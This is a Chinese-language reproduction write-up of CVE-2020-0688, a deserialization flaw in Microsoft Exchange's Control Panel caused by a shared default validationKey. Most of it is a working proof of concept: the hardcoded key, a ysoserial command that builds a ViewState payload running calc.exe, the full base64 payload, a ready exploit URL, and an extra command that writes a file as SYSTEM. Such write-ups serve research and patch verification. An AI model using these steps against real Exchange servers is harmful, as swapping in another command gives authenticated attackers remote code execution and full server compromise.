# CVE-2020-0688

## 原理

CVE-2020-0688是Exchange一个由于默认加密密钥造成的反序列化漏洞，该漏洞存在于Exchange Control Panel(ecp)中，不涉及Exchange的工作逻辑，其本质上是一个`web漏洞`。

具体来说，与正常软件安装每次都会产生随机密钥不同，所有Exchange  Server在安装后的web.config（C:\exchange\setup\serverroles\clientaccess\ecp\web.config）文件中都拥有相同的validationKey和decryptionKey。这些密钥用于保证ViewState的安全性。而ViewState是ASP.NET  Web应用以序列化格式存储在客户机上的服务端数据。客户端通过__VIEWSTATE请求参数将这些数据返回给服务器。攻击者可以在ExchangeControl Panel web应用上执行任意.net代码。

当攻击者通过各种手段获得一个可以访问Exchange Control Panel （ECP）组件的用户账号密码时。攻击者可以在被攻击的exchange上执行任意代码，直接获取服务器权限。

## 复现

### 获取参数

想要利用该漏洞，需要获取四个参数，分别是：

+ validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）

+ validationalg = SHA1（默认，漏洞产生原因）

+ generator = B97B4E27

+ viewstateuserkey = ASP.NET_SessionId（手工获取，变量，每次登陆都不一致）

在这四个变量中，前两个为默认固定，viewstateuserkey和generator的值需要从经过身份验证的session中收集（登录https://ip/ecp/default.aspx，在default.aspx–>Headers–>ASP.NET_SessionId中找到viewstateuserkey的值；在default.aspx–>Response–>__VIEWSTATEGENERATOR中找到generator的值，若未找到该字段，则使用默认的B97B4E27）。

### 生成payload

使用ysoserial工具生成反序列化payload。工具下载地址[ysoserial][https://github.com/Yt1g3r/CVE-2020-0688_EXP]

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c calc.exe" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="1625798e-8558-4302-b6d2-87907ff07126"
```

得到payload如下：

```
/wEytgYAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVy
c2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRl
MzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGlu
Z1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADYBDxSZXNvdXJjZURpY3Rp
b25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1s
L3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5m
eC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9
bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fz
c2VtYmx5PXN5c3RlbSI+DQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9
ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA+DQogICAgIDxPYmpl
Y3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc+Y21k
PC9TeXN0ZW06U3RyaW5nPg0KICAgICAgICA8U3lzdGVtOlN0cmluZz4iL2MgY2FsYy5leGUiIDwvU3lz
dGVtOlN0cmluZz4NCiAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAg
ICA8L09iamVjdERhdGFQcm92aWRlcj4NCjwvUmVzb3VyY2VEaWN0aW9uYXJ5PgvgZt0VYWOvMdz8xDFY
qHsQKtNzdA==
```

### 构造攻击地址

在生成完payload代码后，需要对payload代码进行URL Encode编码构造一个URL

```
https://ExchangeServerIP/ecp/defaults.aspx?__VIEWSTATEGENERATOR=<generator>&__VIEWSTATE=<ViewState>
```

即

```
[+] Exp url: https://192.168.15.158/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E
27&__VIEWSTATE=/wEytgYAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsL
kVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxY
mYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZ
Xh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADYBDxSZ
XNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZ
ngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb
2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0Z
W07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpY
Wdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiI
gT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA
%2BDQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c
3RlbTpTdHJpbmc%2BY21kPC9TeXN0ZW06U3RyaW5nPg0KICAgICAgICA8U3lzdGVtOlN0cmluZz4iL2M
gY2FsYy5leGUiIDwvU3lzdGVtOlN0cmluZz4NCiAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9
kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCjwvUmVzb3VyY2VEaWN0aW9uYXJ
5PgtHiZP1lrub7OvMC2bJowYpBsZWXA%3D%3D
```

### 执行攻击

访问构造好的URL地址，服务器会弹出500的错误，但攻击其实成功了。

登录服务器查看进程，发现计算器已成功启动，权限为system。



## 其他

### 版本

资料显示，该漏洞普遍存在于Microsoft Exchange Server 2010 Service Pack 3，Microsoft Exchange Server 2013，Microsoft Exchange Server 2016，Microsoft Exchange Server 2019。

### 创建文件

`-c “cmd /c echo test > C:\1.txt”`

### 参考资料及利用代码

[利用代码][https://github.com/Yt1g3r/CVE-2020-0688_EXP]

[参考资料1][https://www.freebuf.com/vuls/228735.html]

[参考资料2][https://www.freebuf.com/vuls/228681.html]

